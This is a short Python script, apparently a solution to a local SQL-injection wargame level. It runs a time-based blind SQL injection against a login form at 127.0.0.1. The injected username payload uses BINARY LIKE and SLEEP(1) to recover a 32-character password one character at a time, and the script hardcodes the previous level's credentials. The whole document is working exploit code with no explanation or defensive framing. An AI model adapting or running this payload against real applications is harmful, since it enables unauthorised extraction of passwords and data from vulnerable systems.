#!/usr/bin/python3
import requests, string, time

alphabet = string.ascii_letters + string.digits

url = 'http://127.0.0.1:5000/SQLi-level5'
user = 'level5'
pws = 'kO1eouNe1zQfCoTKJgEuFQbyzj5mPFzY'
auth = (user, pws)

password = []
while (len(password) < 32):
    for ch in alphabet:
        print('level6:',''.join(password) + ch)
        data = {"username":"level6' and BINARY password LIKE \'" + "".join(password) + ch + "%\' and SLEEP(1) #","Search":"Submit"}
        start = time.time()
        response = requests.post(url, auth=auth, data=data)
        end = time.time()
        if int(end - start) >= 1:
            password.append(ch)
            break

print('password found! level6:' + ''.join(password))
